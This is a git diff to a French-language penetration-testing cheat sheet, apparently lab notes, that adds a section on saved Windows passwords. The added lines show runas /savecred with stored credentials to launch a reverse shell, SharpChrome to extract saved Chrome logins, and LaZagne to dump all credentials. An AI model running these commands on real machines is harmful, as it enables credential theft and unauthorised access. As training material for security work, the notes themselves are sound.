@@ -10,6 +10,27 @@ dir "%USERPROFILE%\Documents"
 dir "%USERPROFILE%\Desktop"
 ```
 
+## Mots de passe enregistrés
+
+### cmdkey
+
+Si la commande `cmdkey /list` affiche des comptes, on pourra :
+
+- Se connecter avec `mstsc.exe` avec un mot de passe pré enregistré
+- Executer une fenêtre DOS en tant que :
+
+```shell
+runas /savecred /user:inlanefreight\bob "COMMAND HERE | REVERSE SHELL etc"
+```
+
+### Google Chrome
+
+[SharpChrome](https://github.com/GhostPack/SharpDPAPI) peut extraire les identifiants mot de passe stockés.
+
+```shell
+.\SharpChrome.exe logins /unprotect
+```
+
 ## Fichiers Intéressants
 
 ### Recherche de fichiers
@@ -170,7 +191,7 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 <https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe>
 
 ```
-C:\Users\bob\Desktop> start lazagne.exe all
+lazagne.exe all
 ```
 
 ## Mots de passe dans les stratégies de groupe
